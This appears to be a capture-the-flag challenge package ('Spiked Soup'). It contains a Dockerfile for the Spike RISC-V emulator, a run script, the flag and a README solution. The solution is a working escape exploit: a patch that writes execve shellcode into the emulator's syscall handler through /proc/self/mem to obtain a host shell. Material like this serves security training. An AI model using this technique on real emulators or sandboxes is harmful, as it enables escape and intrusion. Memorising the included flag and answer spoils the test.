{
    "Dockerfile": "FROM ubuntu:18.04 as build\n\nRUN apt update; apt -y --autoremove full-upgrade\nRUN DEBIAN_FRONTEND=noninteractive apt install -y git curl autoconf automake autotools-dev curl libmpc-dev libmpfr-dev libgmp-dev libusb-1.0-0-dev gawk build-essential bison flex texinfo gperf libtool patchutils bc zlib1g-dev device-tree-compiler pkg-config libexpat-dev autoconf automake autotools-dev curl python3 libmpc-dev libmpfr-dev libgmp-dev gawk build-essential bison flex texinfo gperf libtool patchutils bc zlib1g-dev libexpat-dev\n\nRUN mkdir -p /opt/riscv\nRUN mkdir -p /opt/riscv-build\nWORKDIR /opt/riscv-build\n\nENV RISCV=/opt/riscv\nRUN git clone https://github.com/riscv/riscv-gnu-toolchain\nWORKDIR /opt/riscv-build/riscv-gnu-toolchain\n\nRUN ./configure --prefix=$RISCV && \\\n    make -j$(nproc)\n\nWORKDIR /opt/riscv-build\nRUN git clone --recursive https://github.com/riscv-software-src/riscv-isa-sim.git\nRUN mkdir riscv-isa-sim/build\nWORKDIR /opt/riscv-build/riscv-isa-sim/build\nRUN mkdir -p /opt/out\nRUN ../configure --prefix=/opt/out && \\\n    make -j$(nproc) && \\\n    make install\n\nFROM ubuntu:18.04\n\nRUN apt update; apt -y --autoremove full-upgrade\nRUN DEBIAN_FRONTEND=noninteractive apt install -y socat device-tree-compiler sudo\n\nCOPY --from=build /opt/out /usr/\nCOPY run.sh /usr/bin/run.sh\nCOPY flag.txt /root/flag.txt\n\nRUN useradd -ms /bin/bash pwn\nADD pwn-sudoer /etc/sudoers.d/00-pwn\n\nUSER pwn\nENTRYPOINT [\"sh\", \"-c\", \"exec socat TCP-LISTEN:1800,reuseaddr,fork EXEC:'/usr/bin/run.sh',stderr\"]\n",
    "flag.txt": "gigem{a-wh0l3-new-w0rlD-3scAP1n6-r15cV}\n",
    "pwn-sudoer": "pwn\tALL=(ALL) NOPASSWD: ALL\n",
    "README.md": "# Spiked Soup\n## Description\nNo story, just pwn. Remote is executing an unmodified spike emulator (binary in remote attached). User has sudo. Read /root/flag.txt of the host system.\n## Solution\n\nin so much pain. \n1. spike does syscall forwarding (HTIF) for a restricted subset of syscalls; mostly IO (including file io)\n2. /proc/self/mem exists\n3. /proc/self/mem can modify unwritable memory\n4. lmao\n5. steal https://github.com/riscv-software-src/riscv-pk for the syscall/file wrapper functions\n6. modify it to drop shellcode in place of one of the spike syscall handlers\n7. sudo cat /root/flag.txt\n```diff\ndiff --git a/pk/pk.c b/pk/pk.c\nindex b8c9337..7f31419 100644\n--- a/pk/pk.c\n+++ b/pk/pk.c\n@@ -10,6 +10,8 @@\n #include \"usermem.h\"\n #include \"flush_icache.h\"\n #include <stdbool.h>\n+#include \"file.h\"\n+#include \"syscall.h\"\n \n elf_info current;\n long disabled_hart_mask;\n@@ -188,22 +190,103 @@ rest_of_boot_loader:\\n\\\n   mv sp, a0\\n\\\n   tail rest_of_boot_loader_2\");\n \n-void rest_of_boot_loader_2(uintptr_t kstack_top)\n-{\n-  file_init();\n \n-  static arg_buf args; // avoid large stack allocation\n-  size_t argc = parse_args(&args);\n-  if (!argc)\n-    panic(\"tell me what ELF to load!\");\n+int isspace(int c) { return c == ' '; }\n+int isdigit(int c) { return c >= '0' && c <= '9'; }\n+int isalpha(int c) { return (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z'); }\n+int isupper(int c) { return c >= 'A' && c <= 'Z'; }\n+\n+// blatantly stolen from: https://github.com/embeddedartistry/embedded-resources/blob/master/examples/libc/stdlib/strtol.c\n+\n+#include <limits.h>\n+\n+long strtol(const char *nptr, char **endptr, register int base)\n+{\n+    register const char* s = nptr;\n+    register unsigned long acc;\n+    register int c;\n+    register unsigned long cutoff;\n+    register int neg = 0, any, cutlim;\n+\n+    do\n+    {\n+        c = *s++;\n+    } while(isspace(c));\n+    if(c == '-')\n+    {\n+        neg = 1;\n+        c = *s++;\n+    }\n+    else if(c == '+')\n+        c = *s++;\n+    if((base == 0 || base == 16) && c == '0' && (*s == 'x' || *s == 'X'))\n+    {\n+        c = s[1];\n+        s += 2;\n+        base = 16;\n+    }\n+    else if((base == 0 || base == 2) && c == '0' && (*s == 'b' || *s == 'B'))\n+    {\n+        c = s[1];\n+        s += 2;\n+        base = 2;\n+    }\n+    if(base == 0)\n+        base = c == '0' ? 8 : 10;\n+\n+    cutoff = neg ? -(unsigned long)LONG_MIN : LONG_MAX;\n+    cutlim = cutoff % (unsigned long)base;\n+    cutoff /= (unsigned long)base;\n+    for(acc = 0, any = 0;; c = *s++)\n+    {\n+        if(isdigit(c))\n+            c -= '0';\n+        else if(isalpha(c))\n+            c -= isupper(c) ? 'A' - 10 : 'a' - 10;\n+        else\n+            break;\n+        if(c >= base)\n+            break;\n+        if(any < 0 || acc > cutoff || (acc == cutoff && c > cutlim))\n+            any = -1;\n+        else\n+        {\n+            any = 1;\n+            acc *= base;\n+            acc += c;\n+        }\n+    }\n+    if(any < 0)\n+    {\n+        acc = neg ? LONG_MIN : LONG_MAX;\n+        //        errno = ERANGE;\n+    }\n+    else if(neg)\n+        acc = -acc;\n+    if(endptr != 0)\n+        *endptr = (char*)(any ? s - 1 : nptr);\n+    return (acc);\n+}\n \n-  // load program named by argv[0]\n-  static long phdrs[128]; // avoid large stack allocation\n-  current.phdr = (uintptr_t)phdrs;\n-  current.phdr_size = sizeof(phdrs);\n-  load_elf(args.argv[0], &current);\n+const uint8_t sc[29] = {\n+    0x6a, 0x42, 0x58, 0xfe, 0xc4, 0x48, 0x99, 0x52, 0x48, 0xbf,\n+    0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x57, 0x54,\n+    0x5e, 0x49, 0x89, 0xd0, 0x49, 0x89, 0xd2, 0x0f, 0x05\n+}; // stole off shellstorm lol\n \n-  run_loaded_program(argc, args.argv, kstack_top);\n+void rest_of_boot_loader_2(uintptr_t kstack_top)\n+{\n+  file_init();\n+  char buf[64];\n+  file_t* maps = file_open(\"/proc/self/maps\", 0, 0);\n+  file_t* mem = file_open(\"/proc/self/mem\", 2, 0);\n+  file_read(maps, buf, 63);\n+  buf[12] = 0;\n+  char * pEnd;\n+  long program_base = strtol(buf, &pEnd,16);\n+  file_pwrite(mem, sc, 29, program_base+0x5098d0); // address of the syscall openat in spike\n+  file_open(\"lol shell pls\", 0, 0);\n+  shutdown(0);\n }\n \n void boot_loader(uintptr_t dtb)\n```\n",
    "run.sh": "#!/bin/bash\n\nset -o xtrace\n\necho \"Enter the amount of bytes in your ELF, a newline, then your ELF: \"\nread count\n\ntemp=\"$(mktemp)\"\nfunction cleanup {\n  echo \"Removing temporary file\"\n  rm -v \"${temp}\"\n}\ntrap cleanup EXIT\n\nhead -c \"${count}\" > \"${temp}\"\n\ntimeout --foreground 30 spike -l \"${temp}\"\n",
    "solver-template.py": "from pwn import *\n\np = remote(\"tamuctf.com\", 443, ssl=True, sni=\"spiked-soup\")\np.interactive()\n",
    "category": "pwn"
}